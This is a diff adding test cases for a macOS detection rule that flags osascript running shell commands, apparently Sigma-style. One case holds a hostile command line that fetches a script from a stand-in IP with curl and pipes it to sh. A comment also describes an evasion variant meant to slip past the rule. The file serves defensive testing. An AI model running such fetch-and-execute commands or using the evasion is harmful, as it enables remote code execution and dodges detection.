@@ -1,0 +1,15 @@
+# macOS example. osascript-lang-explicit breaks the 'osascript -e' adjacency the
+# rule keys on by inserting the redundant default -l AppleScript.
+rule: rule.yml
+
+cases:
+  - name: osascript do shell script fires
+    event:
+      CommandLine: "osascript -e 'do shell script \"curl http://198.51.100.10/x | sh\"'"
+    match: true
+    selections: [selection_bin, selection_action]
+
+  - name: benign display dialog is not flagged
+    event:
+      CommandLine: "osascript -e 'display dialog \"hello\"'"
+    match: false
